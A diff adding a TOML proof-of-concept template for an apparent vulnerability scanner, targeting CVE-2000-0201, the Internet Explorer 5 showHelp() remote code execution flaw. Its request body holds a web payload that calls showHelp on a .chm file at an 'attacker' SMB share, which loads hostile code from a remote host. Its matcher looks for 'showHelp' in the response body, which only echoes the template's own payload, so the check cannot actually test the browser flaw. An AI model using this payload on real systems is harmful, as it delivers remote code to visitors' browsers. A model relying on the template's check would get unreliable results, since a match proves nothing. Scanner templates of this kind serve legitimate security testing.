@@ -1,0 +1,29 @@
+[info]
+author = "AVE"
+description = "Internet Explorer 5.x window.showHelp() 远程代码执行漏洞验证，通过构造恶意网页调用 showHelp 加载远程 SMB 共享中的 .chm 文件执行任意命令"
+id = "POC-AVE-2000-0178"
+name = "CVE-2000-0201 PoC"
+severity = "medium"
+tags = ["cve-2000-0201"]
+vuln_id = [
+    "CVE-2000-0201",
+    "AVE-2000-0178",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/poc.html"
+protocol = "http"
+
+[poc.requests.body]
+content = "<html><body><script>window.showHelp('file://///attacker/share/exploit.chm');</script></body></html>"
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["showHelp"]
